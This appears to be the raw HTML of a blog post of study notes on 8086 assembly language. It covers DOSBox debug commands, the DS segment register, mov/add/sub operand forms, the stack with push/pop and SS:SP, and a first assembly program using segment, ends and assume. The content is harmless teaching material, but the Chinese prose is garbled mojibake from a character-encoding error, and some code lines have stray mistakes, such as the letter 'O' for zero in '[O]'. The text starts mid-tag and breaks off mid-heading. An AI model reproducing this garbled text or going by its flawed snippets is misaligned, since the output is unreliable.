title="&#x3D;&#x3D;æŸ¥çœ‹cpuå’Œå†…å­˜ï¼Œç”¨æœºå™¨æŒ‡ä»¤å’Œæ±‡ç¼–æŒ‡ä»¤ç¼–ç¨‹ï¼ˆdosboxï¼‰&#x3D;&#x3D;"></a>&#x3D;&#x3D;æŸ¥çœ‹cpuå’Œå†…å­˜ï¼Œç”¨æœºå™¨æŒ‡ä»¤å’Œæ±‡ç¼–æŒ‡ä»¤ç¼–ç¨‹ï¼ˆdosboxï¼‰&#x3D;&#x3D;</h4><p>&#x3D;&#x3D;Rå‘½ä»¤:æŸ¥çœ‹ã€ä¿®æ”¹CPUä¸­å¯„å­˜å™¨çš„å†…å®¹&#x3D;&#x3D;<br>&#x3D;&#x3D;Då‘½ä»¤:æŸ¥çœ‹å†…å­˜ä¸­çš„å†…å®¹&#x3D;&#x3D;<br>&#x3D;&#x3D;Eå‘½ä»¤:ä¿®æ”¹å†…å­˜ä¸­çš„å†…å®¹(å¯ä»¥å†™å…¥æ•°æ®ã€æŒ‡ä»¤ï¼Œåœ¨å†…å­˜ä¸­ï¼Œå®ƒä»¬å®é™…ä¸Šæ²¡æœ‰åŒºåˆ«)&#x3D;&#x3D;</p><p>&#x3D;&#x3D;Uå‘½ä»¤:å°†å†…å­˜ä¸­çš„å†…å®¹è§£é‡Šä¸ºæœºå™¨æŒ‡ä»¤å’Œå¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤&#x3D;&#x3D;</p><p>&#x3D;&#x3D;Tå‘½ä»¤:æ‰§è¡ŒCSIPæŒ‡å‘çš„å†…å­˜å•å…ƒå¤„çš„æŒ‡ä»¤&#x3D;&#x3D;</p><p>&#x3D;&#x3D;Aå‘½ä»¤:ä»¥æ±‡ç¼–æŒ‡ä»¤çš„å½¢å¼å‘å†…å­˜ä¸­å†™å…¥æŒ‡ä»¤&#x3D;&#x3D;</p><h2 id="ç¬¬ä¸‰ç« -å¯„å­˜å™¨-å†…å­˜è®¿é—®"><a href="#ç¬¬ä¸‰ç« -å¯„å­˜å™¨-å†…å­˜è®¿é—®" class="headerlink" title="ç¬¬ä¸‰ç«  å¯„å­˜å™¨(å†…å­˜è®¿é—®)"></a>ç¬¬ä¸‰ç«  å¯„å­˜å™¨(å†…å­˜è®¿é—®)</h2><h4 id="å†…å­˜ä¸­å­—çš„å­˜å‚¨"><a href="#å†…å­˜ä¸­å­—çš„å­˜å‚¨" class="headerlink" title="å†…å­˜ä¸­å­—çš„å­˜å‚¨"></a>å†…å­˜ä¸­å­—çš„å­˜å‚¨</h4><p><strong>å­—å•å…ƒ</strong>ï¼šå³å­˜æ”¾ä¸€ä¸ªå­—å‹æ•°æ®**(16 ä½)<strong>çš„å†…å­˜å•å…ƒï¼Œ</strong>ç”±ä¸¤ä¸ªåœ°å€è¿ç»­çš„å†…å­˜å•å…ƒç»„æˆ<strong>ã€‚</strong>é«˜åœ°å€å†…å­˜å•å…ƒ<strong>ä¸­</strong>å­˜æ”¾<strong>å­—å‹æ•°æ®çš„</strong>é«˜ä½å­—èŠ‚<strong>ï¼Œ</strong>ä½åœ°å€å†…å­˜å•å…ƒ<strong>ä¸­</strong>å­˜æ”¾<strong>å­—å‹æ•°æ®çš„</strong>ä½ä½å­—èŠ‚**ã€‚</p><h4 id="DS-å’Œ-address"><a href="#DS-å’Œ-address" class="headerlink" title="DS å’Œ[address]"></a>DS å’Œ[address]</h4><p><strong>DS å¯„å­˜å™¨</strong>ï¼Œé€šå¸¸ç”¨æ¥å­˜æ”¾è¦è®¿é—®æ•°æ®çš„<strong>æ®µåœ°å€</strong>ã€‚</p><figure class="highlight plaintext"><figcaption><span>Language</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bxï¼Œ1000H</span><br><span class="line">mov ds,bx </span><br><span class="line">mov al,[0]//[0]è¡¨ç¤ºå†…å­˜å•å…ƒçš„åç§»åœ°å€</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„3æ¡æŒ‡ä»¤å°†10000H(1000:)ä¸­çš„æ•°æ®è¯»åˆ°alä¸­</p><p><strong>8086CPU</strong> &#x3D;&#x3D;ä¸æ”¯æŒ&#x3D;&#x3D;å°†æ•°æ®ç›´æ¥é€å…¥<strong>æ®µå¯„å­˜å™¨</strong>çš„æ“ä½œï¼Œ<strong>ds æ˜¯ä¸€ä¸ªæ®µå¯„å­˜å™¨</strong>ï¼Œæ‰€ä»¥mov dsï¼Œ1000Hè¿™æ¡æŒ‡æ˜¯<strong>éæ³•</strong>çš„ã€‚<strong>åªå¥½ç”¨ä¸€ä¸ªå¯„å­˜å™¨æ¥è¿›è¡Œä¸­è½¬</strong></p><h4 id="å­—çš„ä¼ é€"><a href="#å­—çš„ä¼ é€" class="headerlink" title="å­—çš„ä¼ é€"></a>å­—çš„ä¼ é€</h4><p>8086CPUæ˜¯16 ä½ç»“æ„ï¼Œæœ‰ 16 æ ¹æ•°æ®çº¿ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥ä¸€æ¬¡æ€§ä¼ é€ 16 ä½çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä¸€æ¬¡æ€§ä¼ é€ä¸€ä¸ªå­—ã€‚åªè¦åœ¨ mov æŒ‡ä»¤ä¸­ç»™å‡º 16 ä½çš„å­˜å™¨å°±å¯ä»¥è¿›è¡Œ 16 ä½æ•°æ®çš„ä¼ é€äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,11316//2c34H</span><br><span class="line">mov [0],ax</span><br><span class="line">mov bxï¼Œ[0]</span><br><span class="line">sub bxï¼Œ[2]</span><br><span class="line">mov [2],bx</span><br></pre></td></tr></table></figure><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231128190417961.png" alt="image-20231128190417961"></p><h4 id="movã€addã€sub-æŒ‡ä»¤"><a href="#movã€addã€sub-æŒ‡ä»¤" class="headerlink" title="&#x3D;&#x3D;movã€addã€sub æŒ‡ä»¤&#x3D;&#x3D;"></a>&#x3D;&#x3D;movã€addã€sub æŒ‡ä»¤&#x3D;&#x3D;</h4><p>å‰é¢æˆ‘ä»¬ç”¨åˆ°äº†movã€addã€sub æŒ‡ä»¤ï¼Œå®ƒä»¬éƒ½å¸¦æœ‰ä¸¤ä¸ªæ“ä½œå¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov ax,8;mov å¯„å­˜å™¨ï¼Œæ•°æ®</span><br><span class="line">mov ax,bx;mov å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨</span><br><span class="line">mov ax,[0];mov å¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒ</span><br><span class="line">mov [0],ax;mov å†…å­˜å•å…ƒï¼Œå¯„å­˜å™¨</span><br><span class="line">mov ds,ax;mov æ®µå¯„å­˜å™¨ï¼Œå¯„å­˜å™¨</span><br><span class="line">mov ax,ds;mov å¯„å­˜å™¨ï¼Œæ®µå¯„å­˜å™¨</span><br><span class="line">mov [0],cs;mov å†…å­˜å•å…ƒï¼Œæ®µå¯„å­˜å™¨</span><br><span class="line">mov cs,[0];mov æ®µå¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add ax,8;add å¯„å­˜å™¨ï¼Œæ•°æ®</span><br><span class="line">add ax,bx;add å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨</span><br><span class="line">add ax,[0];add å¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒ</span><br><span class="line">add [O],ax;add å†…å­˜å•å…ƒï¼Œå¯„å­˜å™¨</span><br><span class="line">sub ax,9;sub å¯„å­˜å™¨ï¼Œæ•°æ®</span><br><span class="line">sub ax,bx;sub å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨</span><br><span class="line">sub ax,[0];sub å¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒ</span><br><span class="line">sub [O],ax;sub å†…å­˜å¯¼æ˜‚ç‰ˆè‡‚å…ƒï¼Œå¯„å­˜å™¨</span><br></pre></td></tr></table></figure><h4 id="æ•°æ®æ®µ"><a href="#æ•°æ®æ®µ" class="headerlink" title="æ•°æ®æ®µ"></a>æ•°æ®æ®µ</h4><p>å¯¹äº8086PCæœºï¼Œåœ¨ç¼–ç¨‹æ—¶ï¼Œå¯ä»¥æ ¹æ®éœ€è¦ï¼Œå°†ä¸€ç»„å†…å­˜å•å…ƒå®šä¹‰ä¸ºä¸€ä¸ªæ®µã€‚<strong>æˆ‘ä»¬å¯ä»¥å°†ä¸€ç»„é•¿åº¦ä¸º N(N&lt;64KB)ã€åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º 16çš„å€æ•°çš„å†…å­˜å•å…ƒå½“ä½œä¸“é—¨å­˜å‚¨æ•°æ®çš„å†…å­˜ç©ºé—´</strong>ï¼Œä»è€Œå®šä¹‰äº†ä¸€ä¸ªæ•°æ®æ®µã€‚</p><h4 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="&#x3D;&#x3D;æ ˆ&#x3D;&#x3D;"></a>&#x3D;&#x3D;æ ˆ&#x3D;&#x3D;</h4><p>**&#x3D;&#x3D;æ ˆ&#x3D;&#x3D;<strong>æ˜¯ä¸€ç§å…·æœ‰ç‰¹æ®Šçš„è®¿é—®æ–¹å¼çš„å­˜å‚¨ç©ºé—´ã€‚å®ƒçš„ç‰¹æ®Šæ€§å°±åœ¨äºï¼Œ</strong>&#x3D;&#x3D;æœ€åè¿›å…¥&#x3D;&#x3D;<strong>è¿™ä¸ªç©ºé—´çš„æ•°æ®ï¼Œ</strong>&#x3D;&#x3D;æœ€å…ˆå‡ºå»&#x3D;&#x3D;**ã€‚</p><h4 id="CPU-æä¾›çš„æ ˆæœºåˆ¶"><a href="#CPU-æä¾›çš„æ ˆæœºåˆ¶" class="headerlink" title="&#x3D;&#x3D;CPU æä¾›çš„æ ˆæœºåˆ¶&#x3D;&#x3D;"></a>&#x3D;&#x3D;CPU æä¾›çš„æ ˆæœºåˆ¶&#x3D;&#x3D;</h4><p><strong>&#x3D;&#x3D;PUSH&#x3D;&#x3D;(å…¥æ ˆ)</strong> push ax è¡¨ç¤ºå°†<strong>å¯„å­˜å™¨ ax ä¸­çš„æ•°æ®é€å…¥æ ˆä¸­</strong>ï¼Œ</p><p><strong>&#x3D;&#x3D;POP&#x3D;&#x3D;(å‡ºæ ˆ)</strong>pop ax è¡¨ç¤º<strong>ä»é¡¶å–å‡ºæ•°æ®é€å…¥ ax</strong>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">push ax</span><br><span class="line">mov bx,2266H</span><br><span class="line">push bx</span><br><span class="line">mov Cx,1122H</span><br><span class="line">push cx</span><br><span class="line">pop ax</span><br><span class="line">pop bx</span><br><span class="line">pop cx</span><br></pre></td></tr></table></figure><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231129193859165.png" alt="image-20231129193859165"></p><p><strong>&#x3D;&#x3D;æ®µå¯„å­˜å™¨ SS&#x3D;&#x3D;<strong>ï¼šæ ˆé¡¶çš„</strong>æ®µåœ°å€</strong>å­˜æ”¾åœ¨SSä¸­ï¼Œç›¸å…³è§„åˆ™ä¸dsç›¸åŒ mov ss,1000héæ³•</p><p><strong>&#x3D;&#x3D;å¯„å­˜å™¨ SP&#x3D;&#x3D;<strong>ï¼šæ ˆé¡¶çš„</strong>åç§»åœ°å€</strong>å­˜æ”¾åœ¨SPä¸­ã€‚</p><p><strong>&#x3D;&#x3D;ä»»æ„æ—¶åˆ»ï¼ŒSS:SP æŒ‡å‘æ ˆé¡¶å…ƒç´ ã€‚&#x3D;&#x3D;</strong></p><p><strong>å…¥æ ˆæ—¶ï¼Œæ ˆé¡¶ä»&#x3D;&#x3D;é«˜åœ°å€å‘ä½åœ°å€&#x3D;æ–¹å‘å¢é•¿ã€‚</strong></p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231129200014071.png" alt="image-20231129200014071"></p><h4 id="æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜"><a href="#æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜" class="headerlink" title="æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜"></a>æ ˆé¡¶è¶…ç•Œçš„é—®é¢˜</h4><p>pushè¶…ç•Œ</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231130190041473.png" alt="image-20231130190041473"></p><p>popè¶…ç•Œ</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231130190145344.png" alt="image-20231130190145344"></p><p>è¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œ8086CPU <strong>åªçŸ¥é“æ ˆé¡¶åœ¨ä½•å¤„</strong>(ç”±SS:SP æŒ‡ç¤º)ï¼Œè€Œ<strong>ä¸çŸ¥é“æˆ‘ä»¬å®‰æ’çš„æ ˆç©ºé—´æœ‰å¤šå¤§</strong>ã€‚8086CPU å®ƒåªè€ƒè™‘å½“å‰çš„æƒ…å†µ:å½“å‰çš„æ ˆé¡¶åœ¨ä½•å¤„ã€å½“å‰è¦æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯å“ªä¸€æ¡ã€‚<br>æˆ‘ä»¬åœ¨ç¼–ç¨‹çš„æ—¶å€™è¦è‡ªå·±æ“å¿ƒæ ˆé¡¶è¶…ç•Œçš„é—®é¢˜ï¼Œè¦æ ¹æ®å¯èƒ½ç”¨åˆ°çš„æœ€å¤§æ ˆç©ºé—´ï¼Œæ¥å®‰æ’æ ˆçš„å¤§å°ï¼Œé˜²æ­¢å…¥æ ˆçš„æ•°æ®å¤ªå¤šè€Œå¯¼è‡´çš„è¶…ç•Œï¼Œæ‰§è¡Œå‡ºæ ˆæ“ä½œçš„æ—¶å€™ä¹Ÿè¦æ³¨æ„ï¼Œä»¥é˜²æ ˆç©ºçš„æ—¶å€™ç»§ç»­å‡ºæ ˆè€Œå¯¼è‡´çš„è¶…ç•Œã€‚</p><h4 id="pushã€pop-æŒ‡ä»¤"><a href="#pushã€pop-æŒ‡ä»¤" class="headerlink" title="pushã€pop æŒ‡ä»¤"></a>pushã€pop æŒ‡ä»¤</h4><p>push å¯„å­˜å™¨å°†ä¸€ä¸ªå¯„å­˜å™¨ä¸­çš„æ•°æ®å…¥æ ˆ</p><p>pop å¯„å­˜å™¨;å‡ºæ ˆ ç”¨ä¸€ä¸ªå¯„å­˜å™¨æ¥æ”¶å‡ºæ ˆçš„æ•°æ®</p><p>push æ®µå¯„å­˜å™¨å°†ä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­çš„æ•°æ®å…¥æ ˆ</p><p>pop æ®µå¯„å­˜å™¨  å‡ºæ ˆï¼Œç”¨ä¸€ä¸ªæ®µå¯„å­˜å™¨æ¥æ”¶å‡ºæ ˆçš„æ•°æ®</p><p>push å†…å­˜å•å…ƒå°†ä¸€ä¸ªå†…å­˜å­—å•å…ƒå¤„çš„å­—å…¥æ ˆï¼ˆæ³¨æ„:æ ˆæ“ä½œéƒ½æ˜¯ä»¥å­—ä¸ºå•ä½ï¼‰</p><p>pop å†…å­˜å•å…ƒ  å‡ºæ ˆï¼Œç”¨ä¸€ä¸ªå†…å­˜å­—å•å…ƒæ¥æ”¶å‡ºæ ˆçš„æ•°æ®</p><h4 id="æ ˆæ®µ"><a href="#æ ˆæ®µ" class="headerlink" title="æ ˆæ®µ"></a>æ ˆæ®µ</h4><p>å¯¹äº8086PCæœºï¼Œåœ¨ç¼–ç¨‹æ—¶ï¼Œå¯ä»¥æ ¹æ®éœ€è¦ï¼Œå°†ä¸€ç»„å†…å­˜å•å…ƒå®šä¹‰ä¸ºä¸€ä¸ªæ®µã€‚<strong>æˆ‘ä»¬å¯ä»¥å°†é•¿åº¦ä¸º N(N64KB)çš„ä¸€ç»„åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º 16çš„å€æ•°çš„å†…å­˜å•å…ƒï¼Œå½“ä½œæ ˆç©ºé—´æ¥ç”¨ï¼Œ&#x3D;&#x3D;ä»è€Œå®šä¹‰äº†ä¸€ä¸ªæ ˆæ®µ&#x3D;&#x3D;ã€‚</strong>æ¯”å¦‚ï¼Œæˆ‘ä»¬å°†10010H~1001FHè¿™æ®µé•¿åº¦ä¸º 16 å­—èŠ‚çš„å†…å­˜ç©ºé—´å½“ä½œæ ˆæ¥ç”¨ï¼Œä»¥æ ˆçš„æ–¹å¼è¿›è¡Œè®¿é—®ã€‚è¿™æ®µç©ºé—´å°±å¯ä»¥ç§°ä¸ºä¸€ä¸ªæ ˆæ®µï¼Œæ®µåœ°å€ä¸º 1001Hï¼Œå¤§å°ä¸º 16 å­—èŠ‚ã€‚</p><h2 id="ç¬¬å››ç« ï¼šç¬¬ä¸€ä¸ªç¨‹åº"><a href="#ç¬¬å››ç« ï¼šç¬¬ä¸€ä¸ªç¨‹åº" class="headerlink" title="ç¬¬å››ç« ï¼šç¬¬ä¸€ä¸ªç¨‹åº"></a>ç¬¬å››ç« ï¼šç¬¬ä¸€ä¸ªç¨‹åº</h2><h4 id="ä¸€ä¸ªæºç¨‹åºä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹"><a href="#ä¸€ä¸ªæºç¨‹åºä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹" class="headerlink" title="ä¸€ä¸ªæºç¨‹åºä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹-"></a>ä¸€ä¸ªæºç¨‹åºä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹-</h4><p><strong>ç¬¬ä¸€æ­¥:ç¼–å†™æ±‡ç¼–æºç¨‹åº</strong><br>ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨(å¦‚ Editã€è®°äº‹æœ¬ç­‰)ï¼Œç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™æ±‡ç¼–æºç¨‹åºã€‚<br>è¿™ä¸€æ­¥å·¥ä½œçš„ç»“æœæ˜¯äº§ç”Ÿäº†ä¸€ä¸ªå­˜å‚¨æºç¨‹åºçš„æ–‡æœ¬æ–‡ä»¶ã€‚<br><strong>ç¬¬äºŒæ­¥:å¯¹æºç¨‹åºè¿›è¡Œç¼–è¯‘è¿æ¥ã€‚</strong><br>ä½¿ç”¨æ±‡ç¼–è¯­è¨€ç¼–è¯‘ç¨‹åºå¯¹æºç¨‹åºæ–‡ä»¶ä¸­çš„æºç¨‹åºè¿›è¡Œç¼–è¯‘ï¼Œäº§ç”Ÿç›®æ ‡æ–‡ä»¶;å†ç”¨è¿æ¥ç¨‹åºå¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡Œè¿æ¥ï¼Œç”Ÿæˆå¯åœ¨æ“ä½œç³»ç»Ÿä¸­ç›´æ¥è¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚<br>å¯æ‰§è¡Œæ–‡ä»¶åŒ…å«<strong>ä¸¤éƒ¨åˆ†å†…å®¹</strong><br>1.<strong>ç¨‹åº</strong>(ä»æºç¨‹åºä¸­çš„æ±‡ç¼–æŒ‡ä»¤ç¿»è¯‘è¿‡æ¥çš„æœºå™¨ç )<strong>å’Œæ•°æ®</strong>(æºç¨‹åºä¸­å®šä¹‰çš„<br>2.<strong>ç›¸å…³çš„æè¿°ä¿¡æ¯</strong>(æ¯”å¦‚ï¼Œç¨‹åºæœ‰å¤šå¤§ã€è¦å ç”¨å¤šå°‘å†…å­˜ç©ºé—´ç­‰)<br><strong>ç»“æœ</strong>:äº§ç”Ÿäº†ä¸€ä¸ªå¯åœ¨æ“ä½œç³»ç»Ÿä¸­è¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚<br><strong>ç¬¬ä¸‰æ­¥:æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åº</strong></p><p>åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œæ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åº<br>æ“ä½œç³»ç»Ÿä¾ç…§å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æè¿°ä¿¡æ¯ï¼Œå°†å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æœºå™¨ç å’Œæ•°æ®åŠ è½½å…¥å†…å­˜ï¼Œå¹¶è¿›è¡Œç›¸å…³çš„åˆå§‹åŒ–(æ¯”å¦‚è®¾ç½® CS:IP æŒ‡å‘ç¬¬ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡)ï¼Œç„¶åç”± CPU æ‰§è¡Œç¨‹åºã€‚</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231217183643810.png" alt="image-20231217183643810"></p><h4 id="æºç¨‹åº"><a href="#æºç¨‹åº" class="headerlink" title="æºç¨‹åº"></a>æºç¨‹åº</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment//codesgæ˜¯æ®µå</span><br><span class="line">mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,ax</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>åœ¨æ±‡ç¼–è¯­è¨€<strong>æºç¨‹åº</strong>ä¸­ï¼ŒåŒ…å«ä¸¤ç§æŒ‡ä»¤ï¼Œä¸€ç§æ˜¯&#x3D;&#x3D;<strong>æ±‡ç¼–æŒ‡ä»¤</strong>&#x3D;&#x3D;ï¼Œä¸€ç§æ˜¯**&#x3D;&#x3D;ä¼ªæŒ‡ä»¤&#x3D;&#x3D;**</p><p>**&#x3D;&#x3D;æ±‡ç¼–æŒ‡ä»¤&#x3D;&#x3D;<strong>æ˜¯æœ‰å¯¹åº”çš„æœºå™¨ç çš„æŒ‡ä»¤ï¼Œ</strong>å¯ä»¥è¢«ç¼–è¯‘ä¸ºæœºå™¨æŒ‡ä»¤,æœ€ç»ˆä¸º &#x3D;&#x3D;CPU æ‰€æ‰§è¡Œ&#x3D;&#x3D;**ã€‚</p><p><strong>&#x3D;&#x3D;ä¼ªæŒ‡ä»¤&#x3D;&#x3D;<strong>æ²¡æœ‰å¯¹åº”çš„æœºå™¨æŒ‡ä»¤ï¼Œæœ€ç»ˆ</strong>ä¸è¢« CPU æ‰€æ‰§è¡Œ</strong>ï¼Œä¼ªæŒ‡ä»¤<strong>æ˜¯ç”±&#x3D;&#x3D;ç¼–è¯‘å™¨&#x3D;&#x3D;æ¥æ‰§è¡Œçš„æŒ‡ä»¤</strong>ï¼Œç¼–è¯‘å™¨æ ¹æ®ä¼ªæŒ‡ä»¤æ¥è¿›è¡Œç›¸å…³çš„ç¼–è¯‘å·¥ä½œã€‚</p><h6 id="1-ä¼ªæŒ‡ä»¤"><a href="#1-ä¼ªæŒ‡ä»¤" class="headerlink" title="&#x3D;&#x3D;1.ä¼ªæŒ‡ä»¤&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;1.ä¼ªæŒ‡ä»¤&#x3D;&#x3D;</strong></h6><p>1.<strong>segmentå’Œends</strong>æ˜¯ä¸€å¯¹<strong>æˆå¯¹</strong>ä½¿ç”¨çš„ä¼ªæŒ‡ä»¤ï¼Œè¿™æ˜¯åœ¨å†™å¯è¢«ç¼–è¯‘å™¨ç¼–è¯‘çš„æ±‡ç¼–ç¨‹åºæ—¶<strong>å¿…é¡»è¦ç”¨åˆ°çš„ä¸€å¯¹ä¼ªæŒ‡ä»¤</strong>ã€‚segment å’Œendsçš„<strong>åŠŸèƒ½æ˜¯&#x3D;&#x3D;å®šä¹‰ä¸€ä¸ªæ®µ&#x3D;&#x3D;<strong>ã€‚</strong>segment è¯´æ˜ä¸€ä¸ªæ®µå¼€å§‹</strong>ï¼Œ<strong>ends è¯´æ˜ä¸€ä¸ªæ®µç»“æŸ</strong>ã€‚ä¸€ä¸ªæ®µå¿…é¡»æœ‰ä¸€ä¸ªåç§°æ¥æ ‡è¯†ï¼Œä½¿ç”¨æ ¼å¼ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ®µå segment</span><br><span class="line">:</span><br><span class="line">æ®µå ends</span><br></pre></td></tr></table></figure><p>2.<strong>end</strong> æ˜¯ä¸€ä¸ª<strong>æ±‡ç¼–ç¨‹åºçš„&#x3D;&#x3D;ç»“æŸæ ‡è®°&#x3D;&#x3D;<strong>ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ±‡ç¼–ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœç¢°åˆ°äº†ä¼ªæŒ‡ä»¤ endï¼Œå°±ç»“æŸå¯¹æºç¨‹åºçš„ç¼–è¯‘ã€‚æ‰€ä»¥ï¼Œåœ¨æˆ‘ä»¬å†™ç¨‹åºçš„æ—¶å€™ï¼Œ</strong>å¦‚æœç¨‹åºå†™å®Œäº†ï¼Œè¦åœ¨ç»“å°¾å¤„åŠ ä¸Šä¼ªæŒ‡ä»¤end</strong>ã€‚<strong>å¦åˆ™ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘ç¨‹åºæ—¶ï¼Œæ— æ³•çŸ¥é“ç¨‹åºåœ¨ä½•å¤„ç»“æŸã€‚</strong><br>&#x3D;&#x3D;<strong>æ³¨æ„ï¼Œä¸è¦ææ··äº†endå’Œends</strong>&#x3D;&#x3D;ï¼Œ<strong>ends æ˜¯å’Œsegment æˆå¯¹ä½¿ç”¨çš„</strong>ï¼Œ<strong>æ ‡è®°ä¸€ä¸ªæ®µçš„ç»“æŸendsçš„å«ä¹‰å¯ç†è§£ä¸ºâ€œend segmentâ€</strong>ã€‚æˆ‘ä»¬è¿™é‡Œè®²çš„<strong>end çš„ä½œç”¨æ˜¯æ ‡è®°æ•´ä¸ªç¨‹åºçš„ç»“æŸã€‚</strong></p><p>3.assume<br>è¿™æ¡ä¼ªæŒ‡ä»¤çš„å«ä¹‰ä¸º<strong>â€œå‡è®¾â€</strong>ã€‚<strong>å®ƒå‡è®¾æŸä¸€æ®µå¯„å­˜å™¨å’Œç¨‹åºä¸­çš„æŸä¸€ä¸ªç”¨segmentâ€¦ends å®šä¹‰çš„æ®µç›¸å…³è”</strong>ã€‚<strong>é€šè¿‡ assume è¯´æ˜è¿™ç§å…³è”ï¼Œåœ¨éœ€è¦çš„æƒ…å†µä¸‹ï¼Œç¼–è¯‘ç¨‹åºå¯ä»¥å°†æ®µå¯„å­˜å™¨å’ŒæŸä¸€ä¸ªå…·ä½“çš„æ®µç›¸è”ç³»</strong>ã€‚assume å¹¶ä¸æ˜¯ä¸€æ¡éè¦æ·±å…¥ç†è§£ä¸å¯çš„ä¼ªæŒ‡ä»¤ï¼Œä»¥åæˆ‘ä»¬ç¼–ç¨‹æ—¶ï¼Œè®°ç€<strong>ç”¨ assume å°†æœ‰ç‰¹å®šç”¨é€”çš„æ®µå’Œç›¸å…³çš„æ®µå¯„å­˜å™¨å…³è”èµ·æ¥å³å¯ã€‚</strong><br>æ¯”å¦‚ï¼Œåœ¨ç¨‹åº4.1ä¸­ï¼Œæˆ‘ä»¬ç”¨ codesg segment â€¦ codesg ends å®šä¹‰äº†ä¸€ä¸ªåä¸º <strong>codsegçš„æ®µ</strong>ï¼Œåœ¨<strong>è¿™ä¸ªæ®µä¸­å­˜æ”¾ä»£ç </strong>ï¼Œæ‰€ä»¥<strong>è¿™ä¸ªæ®µæ˜¯ä¸€ä¸ªä»£ç æ®µ</strong>ã€‚åœ¨ç¨‹åºçš„å¼€å¤´ï¼Œ<strong>ç”¨ &#x3D;&#x3D;assume cs:codesg&#x3D;&#x3D;å°†ç”¨ä½œä»£ç æ®µçš„æ®µ &#x3D;&#x3D;codesg å’ŒCPUä¸­çš„æ®µå­˜å™¨cs è”ç³»èµ·æ¥&#x3D;&#x3D;ã€‚</strong></p><h6 id="2-æºä»£ç ä¸­çš„ç¨‹åº"><a href="#2-æºä»£ç ä¸­çš„ç¨‹åº" class="headerlink" title="&#x3D;&#x3D;2.æºä»£ç ä¸­çš„ç¨‹åº&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;2.æºä»£ç 